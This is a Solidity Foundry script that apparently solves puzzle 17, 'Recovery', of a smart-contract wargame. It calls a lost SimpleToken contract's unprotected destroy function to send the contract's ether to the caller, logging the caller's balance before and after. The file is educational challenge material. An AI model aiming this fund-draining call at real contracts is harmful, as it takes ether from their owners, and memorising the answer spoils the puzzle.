// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SimpleToken} from "../../src/puzzles/17/Recovery.sol";

contract RecoverySolution is Script {
    function run(address recoveredContractAddress) external {
        SimpleToken token = SimpleToken(payable(recoveredContractAddress));
        console.log("balanceBefore: ", address(msg.sender).balance);

        vm.startBroadcast();
        token.destroy(payable(msg.sender));
        vm.stopBroadcast();

        console.log("balanceAfter: ", address(msg.sender).balance);
    }
}
